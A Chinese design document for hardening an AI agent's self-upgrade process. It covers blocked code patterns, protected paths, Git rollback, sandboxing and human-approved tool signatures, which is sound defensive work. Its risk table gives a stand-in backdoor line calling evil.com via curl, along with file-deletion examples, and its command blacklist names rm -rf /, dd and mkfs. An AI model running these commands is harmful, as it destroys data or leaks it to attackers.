# 工具自我升级 - 安全加固设计

## 一、风险概述

当前升级流程存在以下不可恢复风险：

| 风险类型 | 示例 | 后果 |
|----------|------|------|
| 无限循环 | `while True: pass` | DoS、资源耗尽 |
| 删除核心文件 | `os.remove("main.py")` | 系统不可用 |
| 篡改 registry | 修改 `tools/registry.py` | 工具系统失效 |
| 篡改 agent | 修改 `agent/core.py` | 核心逻辑被改写 |
| 植入后门 | `subprocess.run("curl evil.com")` | 数据泄露/远程控制 |

---

## 二、安全加固架构

```
┌─────────────────────────────────────────────────────────────────┐
│                    升级请求                                       │
└───────────────────────────┬─────────────────────────────────────┘
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│  1. 行为白名单校验 (Pre-check)                                    │
│     - 静态分析生成代码                                            │
│     - 禁止模式：exec/eval、os.remove、shutil.rmtree、__import__   │
│     - 禁止路径：agent/、main.py、tools/registry.py、tools/__init__│
└───────────────────────────┬─────────────────────────────────────┘
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│  2. Git 版本锁                                                   │
│     - 升级前：git add + commit（保存当前干净状态）                 │
│     - 升级后：若失败，git checkout -- . 回滚                      │
└───────────────────────────┬─────────────────────────────────────┘
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│  3. 沙箱执行环境 (可选)                                           │
│     - 终端命令：subprocess + timeout + cwd 限制                   │
│     - 工具执行：RestrictedPython / 子进程隔离                     │
└───────────────────────────┬─────────────────────────────────────┘
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│  4. 工具签名校验                                                  │
│     - 加载前：计算 .py 文件 hash，与允许清单对比                   │
│     - 或：人工审批后写入 signatures.json                          │
└───────────────────────────┬─────────────────────────────────────┘
                            ▼
┌─────────────────────────────────────────────────────────────────┐
│  5. 回滚机制                                                     │
│     - POST /upgrade/rollback：恢复到上一 tag/commit               │
│     - 启动时检测：若核心文件损坏，自动 git checkout                │
└─────────────────────────────────────────────────────────────────┘
```

---

## 三、行为白名单

### 3.1 禁止的代码模式（正则/关键词）

| 类别 | 禁止项 | 说明 |
|------|--------|------|
| 执行 | `exec(`, `eval(`, `compile(`, `__import__` | 任意代码执行 |
| 导入 | `import os`, `import subprocess`, `import shutil` | 高危模块（可放宽为仅限白名单） |
| 文件 | `os.remove`, `os.unlink`, `shutil.rmtree`, `open(..., 'w')` 写核心路径 | 删除/覆盖 |
| 系统 | `os.system`, `subprocess.run`, `subprocess.Popen` | 任意命令 |
| 反射 | `getattr(`, `setattr(`, `globals()`, `locals()` | 篡改运行时 |
| 循环 | `while True`（无 sleep/break） | 无限循环（启发式） |

### 3.2 禁止修改的路径（保护清单）

```
agent/           # 整个 agent 目录
main.py          # 入口
tools/registry.py
tools/__init__.py
tools/base.py
```

### 3.3 允许写入的目录（白名单）

```
tools/generated/     # 仅允许新增/修改此目录下的 .py
data/generated_tools/  # JSON 格式的 dynamic tool
```

---

## 四、沙箱执行环境

### 4.1 终端命令沙箱（ResourceDispatcher / TerminalTool）

- **工作目录限制**：仅允许 `backend/`、`tools/generated/`、`data/`
- **超时**：所有命令默认 timeout=60s，可配置
- **命令黑名单**：`rm -rf /`、`dd`、`mkfs`、`chmod 777` 等
- **禁止写入**：`agent/`、`main.py`、`tools/registry.py`、`tools/__init__.py`

### 4.2 工具执行沙箱（可选，进阶）

- **RestrictedPython**：限制生成的工具代码可用的 builtins
- **或**：工具在独立子进程中执行，主进程仅通过 IPC 获取结果，超时即 kill

---

## 五、工具签名校验

### 5.1 流程

1. 新工具写入 `tools/generated/xxx.py` 后：
2. 计算 `sha256(文件内容)` 得到 `signature`
3. 若 `signatures.json` 中存在该工具且 hash 匹配 → 允许加载
4. 若不存在 → **默认拒绝**，除非：
   - 人工审批后执行 `POST /tools/approve?name=xxx` 将 hash 加入白名单
   - 或配置 `MACAGENT_TRUST_ALL_GENERATED=true`（不推荐）

### 5.2 签名文件格式

```json
{
  "example_generated": {
    "sha256": "abc123...",
    "approved_at": "2025-02-23T12:00:00Z",
    "approved_by": "manual"
  }
}
```

---

## 六、Git 版本管理与回滚

### 6.1 前置：Git 仓库 + GitHub

1. 在 MacAgent 项目根目录初始化 Git（若尚未初始化）：
   ```bash
   cd /path/to/MacAgent
   git init
   git add .
   git commit -m "Initial: before upgrade security"
   ```

2. 在 GitHub 创建仓库，例如 `your-username/MacAgent`

3. 关联远程并推送：
   ```bash
   git remote add origin https://github.com/your-username/MacAgent.git
   git branch -M main
   git push -u origin main
   ```

### 6.2 升级流程中的 Git 使用

| 阶段 | 操作 |
|------|------|
| 升级前 | `git add . && git commit -m "checkpoint before upgrade"` 或 `git tag pre-upgrade-{timestamp}` |
| 升级执行 | Cursor/Terminal 修改文件 |
| 升级成功 | `git add . && git commit -m "upgrade: {summary}"` |
| 升级失败 | `git checkout -- .` 或 `git reset --hard HEAD` 回滚工作区 |

### 6.3 回滚 API

```
POST /upgrade/rollback
  Body: { "target": "HEAD~1" | "tag:pre-upgrade-xxx" }
  或: { "target": "last_stable" }  # 回滚到上一个 tag
```

### 6.4 启动时自愈

- 检测核心文件是否存在且可导入
- 若 `main.py`、`agent/core.py` 等损坏：`git checkout -- <path>` 恢复
- 若仍失败：提示用户手动 `git checkout -- .`

---

## 七、版本锁（锁定核心版本）

- **锁定文件**：`tools/registry.py`、`agent/core.py`、`main.py` 等
- **实现**：在 Git 中这些文件设为 `skip-worktree` 或通过 `git update-index --assume-unchanged` 防止意外修改
- **或**：每次修改前检查，若涉及保护路径则拒绝升级

---

## 八、实现文件规划

| 文件 | 职责 |
|------|------|
| `agent/upgrade_security.py` | 白名单校验、签名校验、禁止路径检查 |
| `agent/upgrade_git.py` | Git 提交、tag、回滚 |
| `tools/registry.py` | 加载前调用 security 校验 |
| `agent/resource_dispatcher.py` | 命令沙箱（cwd、黑名单、超时） |
| `data/signatures.json` | 已审批工具签名 |
| `data/protected_paths.txt` | 保护路径配置 |

---

## 九、环境变量与配置

| 变量 | 说明 | 默认 |
|------|------|------|
| `MACAGENT_UPGRADE_SANDBOX` | 是否启用沙箱 | `true` |
| `MACAGENT_UPGRADE_GIT` | 是否使用 Git 版本管理 | `true` |
| `MACAGENT_TRUST_ALL_GENERATED` | 跳过签名校验（不推荐） | `false` |
| `MACAGENT_PROTECTED_PATHS` | 额外保护路径，逗号分隔 | （见默认配置） |

---

## 十、GitHub 仓库设置

详见 **[GITHUB_SETUP_GUIDE.md](./GITHUB_SETUP_GUIDE.md)**，简要步骤：

1. 在 [GitHub](https://github.com/new) 创建仓库
2. 本地 `git init`、`git add .`、`git commit`
3. `git remote add origin https://github.com/your-username/MacAgent.git`
4. `git push -u origin main`
5. 打 tag：`git tag -a v1.0-stable -m "Baseline"` 便于回滚

### 10.1 仓库设置建议

1. **分支策略**：`main` 为稳定版，升级在本地 commit 后 push
2. **.gitignore**：排除 `venv/`、`__pycache__/`、`.env`、`data/contexts/*.json`（若含敏感信息）
3. **保护分支**：在 GitHub 设置中可对 `main` 启用「 Require pull request reviews」以人工审核
4. **Actions（可选）**：CI 运行基础测试，确保升级不破坏核心逻辑

---

## 十一、快速检查清单

升级前必须通过：

- [ ] 行为白名单：无禁止模式
- [ ] 路径白名单：仅修改 `tools/generated/` 或 `data/generated_tools/`
- [ ] Git 已 commit 当前状态
- [ ] 签名校验通过（或人工已审批）
- [ ] 沙箱：命令 cwd、timeout、黑名单检查
